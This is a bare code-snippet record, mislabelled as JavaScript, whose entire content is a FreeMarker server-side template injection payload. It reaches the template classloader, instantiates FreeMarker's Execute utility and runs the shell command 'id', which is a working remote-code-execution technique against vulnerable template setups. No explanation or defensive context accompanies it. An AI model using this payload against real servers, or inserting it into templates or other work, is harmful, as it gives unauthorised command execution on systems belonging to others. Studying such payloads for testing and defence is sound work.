---
id: 1c56b34a-b010-466d-b24e-996300033489
type: code
language: js
verified: false
created_at: '2023-04-06T03:56:39.073171+00:00'
updated_at: '2023-04-10T20:23:38.561561+00:00'
---

# Code Snippet 1c56b34a

**Language**: js

```js
<#assign classloader=article.class.protectionDomain.classLoader>
<#assign owc=classloader.loadClass("freemarker.template.ObjectWrapper")>
<#assign dwf=owc.getField("DEFAULT_WRAPPER").get(null)>
<#assign ec=classloader.loadClass("freemarker.template.utility.Execute")>
${dwf.newInstance(ec,null)("id")}
```


